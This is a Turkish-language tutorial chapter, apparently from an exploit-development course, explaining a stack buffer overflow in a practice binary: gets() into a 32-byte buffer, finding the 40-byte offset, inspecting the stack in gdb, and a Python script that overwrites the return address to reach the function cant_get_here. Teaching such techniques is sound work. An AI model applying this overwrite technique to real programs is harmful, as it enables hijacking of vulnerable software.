# Hedefimiz
Bu bölüm için hedefimiz programın akışını değiştirerek normalde 
erişilemez olan `cant_get_here` fonksiyonuna ulaşmak.

# Kod analizi
Bölüm için verilen C koduna baktığımız zaman güvenli olmayan `gets()`
fonksiyonun 32 bytelık uzunluğa sahip bir karakter dizisine kullanıcı
girdisi kopyalamak için kullanıldığını görüyoruz:
```c
  char overflow[32];
  ...
  // !! OVERFLOW HERE !!
  gets(overflow);
```
`gets()` overflow kontorlü yapmadığından kullanıcının 32 karakterdan daha uzun
bir girdi sağlıyarak değeri stack'te tutulan `overflow` karakter dizisi üzerinden
stack overflow zafiyetini exploit etmesi mümkün.

# PoC exploiti
Hadi öncellikle burda gerçekten de bir zafiyet olduğunu doğrulamak ile başlayalım.
Bunu doğrulamak adına, programa uzun bir karakter çıktısı sağlayabiliriz:
```bash
python3 -c "print('A'*100)" | ./0x0
```
Bu programın çökmesine, yani `segmentation fault`a (segfault) neden olacaktır. Ama ne kadar 
karakterden sonra programın çökmesine sebep olmaya başlayabiliriz?

Burda anlamamız gereken şey programın neden çöktüğü. Program stack üzerinde
kayıtlı olan dönüş adresinin üzerine yazdığımız zaman çöküyor. Çöktüğü noktada
`main()` fonksiyonun dönüş yaptığı nokta. Bu noktaya geldiğimizde, program 
stack üzerinde kayıtlı olan dönüş adresine gitmeye çalışıyor. Ancak dönüş adresi
artık tamamı ile anlamsız A harfleri ile dolduğundan hatalı bir adrese dönüyor ve
`segmentation fault` hatası alıyoruz.

Bu bilgi ile aslında size neden aldığımız hatanın isminin `segmentation fault` olduğunu
açıklayabilirim. Çalışma esnasında, kernel her program için sanal bir bellek oluşturur.
Program, kendine özel bu belleğin dışına erişmeye çalışınca, program kendine ayrılan
bellek bölgesinin dışına erişemiyeceğinden (bölge yani segment, isim burdan geliyor)
kernel programın bu davranışını raporlar, ardından da programı sonlandırır.

Bu sonlandırma işlemi için kernel programa ESEGV (11) sinyalini gönderir. Bunu `kill -11 <pid>`
komutu ile kendiniz de test edebilirsiniz.

### Hangi noktadan sonra return adrese yazabiliriz?
Çok basit. 32 bytelık dizimizi zaten doldurmamız lazım, elde var 32. Return adresin üstünde
anlık içinde bulunduğumuz fonksiyonun stack adresini belirleyen `rbp` (base pointer) var,
8 byte daha eklersek 40. Yani tekniken 40 karakterden sonra return adrese yazmaya başlayabiliriz.

İşte size bir soru! Programa tam olarak 40 karakterlik bir çıktı sağlarsak ne olur?
- **A)** Program sorunsuz şekilde çalışmaya devam eder
- **B)** Program çöker
- **C)** Öylesine okuyordunuz ve cevabı bilmiyorsunuz

Az önce söylediğime göre *tekniken* 40 karakterden **sonra** return adrese yazmaya başlayabiliriz değil mi?
Evet bu doğru yani cevap A seçeneği... Ya da öyle mi? Eğer aşağıdaki komutu çalıştırırsanız yine de bir
segfault alıcaksınız:
```bash
python3 -c "print('A'*40)" | ./0x0
```

Çok ilginç... Peki Watson, bu nasıl oluyor?

### C'nin gizemlerle dolu dünyası...
Evet yukardaki şey hatalı değil, 40 karakterden sonra adrese yazmaya başlıyoruz. Ama sorun `gets()`
fonksiyonun 40 karakter okumaması.

Eğer `gets()` fonksiyonun manual sayfasına bakarsanız, açıklamasında şunu görecekseniz:
```
       gets()  reads a line from stdin into the buffer pointed to by s until either a ter‐
       minating newline or EOF, which it replaces with a null byte ('\0').  No  check  for
       buffer overrun is performed (see BUGS below).
```

Yani `gets()` en sondaki yeni satır karakterini veya EOF'u (End-Of-File) `\0` (`0x00`) ile değiştiriyor.
Peki bunu neden yapıyor? C bilenleriniz çoktan durumu kavradı bile. C'de karakter dizilerinin
nerde bittiğini takip bir yolu olmadığından genel C fonksiyonları karakter dizeleri ile işlemlerini 
`\0` karakterine kadar yapıyor. C için `\0` karakteri "hey karakter dizesinin sonuna geldik dostum" işareti gibi
birşey. O yüzden bu karakter null byte'ın yani sıra **trailing null** olarak da bilinir. Bu olaya da 
genel olarak **null termination** denir.

Hadi sonucu gelelim. Biz 40 karakter girdiğimizde `gets()` aslında `overflow` dizesine esktra bir `\0`
yazdığından totalde 41 karakter ile return adrese yazmış oluyoruz ve program çöküyor.

Anlaşılan gizemi çözdük Watson!

### Kullanışsız bir PoC
Hadi python ile basit bir PoC yazalım:
```python
from struct import pack

filler = b"A"*40 # overflow[] + rsp
ret    = b"N"*8

f = open("/tmp/ex", "wb")
f.write(filler+ret)
f.close()
```
Bu PoC basitçe dönüş adresini `N` harfi ile (`0x4e`) doldurmalı. Bunu test etmek
adına programımızı gdb'de açabiliriz.

Şimdi programı gdb ile başlatmak için
```bash
gdb ./0x0
```

Hadi önce okunabilir olan intel assembly moduna geçelim:
```
set disassembly-flavor intel
```

Daha sonra `gdb`'de gets fonksiyonundan hemen sonraya bir breakpoint yerleştirebiliriz:
```
disassemble main
```
bu çıktıdan `call   ... <gets@plt>`den sonraki adresi bulun, ardından breakpoint
yerleştirmek için:
```
break *<adres>
```

Şimdi ise sıra programı `/tmp/ex` girdisi ile çalıştırmakta:
```
run < /tmp/ex
```

Anında breakpointe varacağız, şimdi hadi stack'e bakalım:
```
x/24g $rsp
```

Aşağıdaki gibi bir çıktı görüyor olmanız lazım:
```
...:	0x4141414141414141	0x4141414141414141
...:	0x4141414141414141	0x4141414141414141
...:	0x4141414141414141	0x4e4e4e4e4e4e4e4e
```
`0x4e`yi görüyor musunuz? İşte orası return adresin olduğu yerdi, üzerine yazmayı başardık!

Şidmi eğer programı çalıştırmaya devam ederseniz segfault alacağız:
```
c
```

Artık tüm konseptleri anladığımıza göre, işe yarar bir exploit yazabiliriz!

# Son exploit
Şimdi programın akışını nasıl `cant_get_here` fonksiyonuna çevireceğimizi 
tahmin ettiğinizi düşünüyorum. Tek yapmamız gereken PoC exploitimizdeki `ret` değişkenine
`cant_get_here`'ın adresini vermek. Bu durumda program bu adrese dönüş yapıcak, biz de
hedefimize erişmiş olacağız.

`cant_get_here`ın adresini bulmak için `objdump` aracını kullanabiliriz:
```bash
objdump -d ./0x0  | grep cant_get_here
```

baştaki adresi kopyalıyalım, bunu `pack` fonksiyonu ile exploitimize yerleştirebiliriz:
```python
from struct import pack

filler = b"A"*40
ret    = pack("<Q", 0x<adres>)

f = open("/tmp/ex", "wb")
f.write(filler+ret)
f.close()
```

`pack` fonksiyonu little/big endian muhabbetini halletmemizi sağlıyor. İlk başta
verdiğimiz `<Q` argümanındaki `<` basitçe verinin little endian ile paketlenmesini söylerken
`Q` verinin `unsigned long long` olarak (8 byte) paketlenmesini söylüyor. Bu fonksiyon ve
argümanları hakkında daha fazla bilgi için [`struct` modülün dökümentasyonunu inceleyin](https://docs.python.org/3/library/struct.html).

Bunun ile beraber exploitimiz hazır, hadi deneyelim:
```bash
python3 exploit.py && cat /tmp/ex | ./0x0
```

Alıcağınız çıktı şöyle birşey olmalı:
```
root@o101:~/0x0# cat /tmp/ex | ./0x0
Hello, what's your name?
Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF@!
How did we get here?
Segmentation fault (core dumped)
```
Ve başardık! `cant_get_here` fonksiyonuna ulaştık. 

Fakat program yine de çökücektir. Bunun sebebi `cant_get_here`ın normalde başka bir fonksiyona ait olan
stack frame'ini kullanması. Bu sebeple `cant_get_here` işini bitirdiğinde stack frame'i doğru şekilde
temizlenemiyor, ve return adresi tamamiyle rastgele bir adrese denk geliyor. 

Ama bu bizim için önemli değil, sonuç olarak hedefmize ulaştık!

---
[Önceki](basics.md) | [Sonraki](0x1.md)
